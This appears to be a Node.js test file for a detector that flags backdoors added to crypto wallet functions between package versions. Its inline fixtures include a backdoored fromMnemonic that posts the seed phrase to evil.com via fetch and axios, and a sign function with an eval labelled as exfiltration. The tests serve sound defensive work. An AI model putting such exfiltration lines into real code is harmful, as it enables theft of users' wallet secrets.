import { test } from 'node:test';
import assert from 'node:assert';
import { scan } from '../backend/detectors/tier1-crypto-primitive-tamper.js';
import {
  maliciousAccountsClean,
  maliciousAccountsBackdoor,
  legitimateAccountsClean,
  legitimateAccountsUpdated,
} from './fixtures/campaigns/crypto-tamper/fixtures.js';

test('detects semantic backdoor in fromMnemonic with new fetch call', async () => {
  const pkgJson = {
    name: '@injectivelabs/sdk-ts',
    version: '1.20.21',
  };

  const allFiles = [
    {
      path: 'dist/cjs/accounts-Cy0p4lLW.cjs',
      content: maliciousAccountsBackdoor,
    },
  ];

  const previousFiles = [
    {
      path: 'dist/cjs/accounts-AbCdEf123.cjs',
      content: maliciousAccountsClean,
    },
  ];

  const findings = await scan(pkgJson, [], null, allFiles, {
    previousFiles,
    previousVersion: '1.20.20',
  });

  assert.strictEqual(findings.length, 2, 'Should detect backdoor in fromMnemonic and fromHex');

  const fromMnemonicFinding = findings.find((f) =>
    f.evidence.some((e) => e.includes('fromMnemonic'))
  );
  assert.ok(fromMnemonicFinding, 'Should detect backdoor in fromMnemonic');
  assert.strictEqual(fromMnemonicFinding.id, 'TIER1-CRYPTO-TAMPER');
  assert.strictEqual(fromMnemonicFinding.severity, 'high');
  assert.strictEqual(fromMnemonicFinding.confidenceScore, 85);
  assert.ok(
    fromMnemonicFinding.evidence.some((e) => e.includes('new_network_calls: fetch')),
    'Should detect new fetch call'
  );

  const fromHexFinding = findings.find((f) => f.evidence.some((e) => e.includes('fromHex')));
  assert.ok(fromHexFinding, 'Should detect backdoor in fromHex');
  assert.strictEqual(fromHexFinding.id, 'TIER1-CRYPTO-TAMPER');
  assert.ok(
    fromHexFinding.evidence.some((e) => e.includes('new_network_calls: fetch')),
    'Should detect new fetch call in fromHex'
  );
});

test('does not flag legitimate analytics that existed in previous version', async () => {
  const pkgJson = {
    name: '@solana/web3.js',
    version: '1.95.1',
  };

  const allFiles = [
    {
      path: 'lib/accounts.js',
      content: legitimateAccountsUpdated,
    },
  ];

  const previousFiles = [
    {
      path: 'lib/accounts.js',
      content: legitimateAccountsClean,
    },
  ];

  const findings = await scan(pkgJson, [], null, allFiles, {
    previousFiles,
    previousVersion: '1.95.0',
  });

  assert.strictEqual(findings.length, 0, 'Should not flag legitimate analytics');
});

test('does not flag when no previous version available', async () => {
  const pkgJson = {
    name: 'new-crypto-lib',
    version: '1.0.0',
  };

  const allFiles = [
    {
      path: 'dist/accounts.js',
      content: maliciousAccountsBackdoor,
    },
  ];

  const findings = await scan(pkgJson, [], null, allFiles, {
    previousFiles: null,
  });

  assert.strictEqual(findings.length, 0, 'Should not flag without previous version');
});

test('does not flag when no accounts file present', async () => {
  const pkgJson = {
    name: 'some-package',
    version: '1.0.0',
  };

  const allFiles = [
    {
      path: 'dist/index.js',
      content: 'module.exports = {};',
    },
  ];

  const previousFiles = [
    {
      path: 'dist/index.js',
      content: 'module.exports = {};',
    },
  ];

  const findings = await scan(pkgJson, [], null, allFiles, {
    previousFiles,
  });

  assert.strictEqual(findings.length, 0, 'Should not flag without accounts file');
});

test('does not flag known reputable packages', async () => {
  const pkgJson = {
    name: 'react',
    version: '18.2.0',
  };

  const allFiles = [
    {
      path: 'dist/accounts.js',
      content: maliciousAccountsBackdoor,
    },
  ];

  const previousFiles = [
    {
      path: 'dist/accounts.js',
      content: maliciousAccountsClean,
    },
  ];

  const findings = await scan(pkgJson, [], null, allFiles, {
    previousFiles,
  });

  assert.strictEqual(findings.length, 0, 'Should not flag known reputable packages');
});

test('detects new eval() in sign function', async () => {
  const pkgJson = {
    name: 'crypto-wallet-sdk',
    version: '2.0.1',
  };

  const cleanSign = `
    function sign(message) {
      return crypto.sign(this.privateKey, message);
    }
  `;

  const backdooredSign = `
    function sign(message) {
      eval('console.log("exfiltrating:", message)');
      return crypto.sign(this.privateKey, message);
    }
  `;

  const allFiles = [
    {
      path: 'dist/accounts.js',
      content: backdooredSign,
    },
  ];

  const previousFiles = [
    {
      path: 'dist/accounts.js',
      content: cleanSign,
    },
  ];

  const findings = await scan(pkgJson, [], null, allFiles, {
    previousFiles,
    previousVersion: '2.0.0',
  });

  assert.strictEqual(findings.length, 1, 'Should detect new eval in sign');
  assert.ok(
    findings[0].evidence.some((e) => e.includes('new_dynamic_code: eval')),
    'Should detect eval'
  );
});

test('handles malformed JavaScript gracefully', async () => {
  const pkgJson = {
    name: 'broken-package',
    version: '1.0.0',
  };

  const allFiles = [
    {
      path: 'dist/accounts.js',
      content: 'this is not valid javascript {{{',
    },
  ];

  const previousFiles = [
    {
      path: 'dist/accounts.js',
      content: maliciousAccountsClean,
    },
  ];

  const findings = await scan(pkgJson, [], null, allFiles, {
    previousFiles,
  });

  assert.strictEqual(findings.length, 0, 'Should handle malformed JS gracefully');
});

test('detects multiple new network patterns in same function', async () => {
  const pkgJson = {
    name: 'multi-exfil-sdk',
    version: '1.0.1',
  };

  const cleanFunc = `
    function fromMnemonic(mnemonic) {
      return deriveKey(mnemonic);
    }
  `;

  const backdooredFunc = `
    function fromMnemonic(mnemonic) {
      fetch('https://evil.com/steal', { body: mnemonic });
      axios.post('https://backup.evil.com', { mnemonic });
      return deriveKey(mnemonic);
    }
  `;

  const allFiles = [
    {
      path: 'dist/accounts.js',
      content: backdooredFunc,
    },
  ];

  const previousFiles = [
    {
      path: 'dist/accounts.js',
      content: cleanFunc,
    },
  ];

  const findings = await scan(pkgJson, [], null, allFiles, {
    previousFiles,
    previousVersion: '1.0.0',
  });

  assert.strictEqual(findings.length, 1, 'Should detect backdoor');
  const evidence = findings[0].evidence.find((e) => e.includes('new_network_calls'));
  assert.ok(evidence.includes('fetch'), 'Should detect fetch');
  assert.ok(evidence.includes('axios'), 'Should detect axios');
});
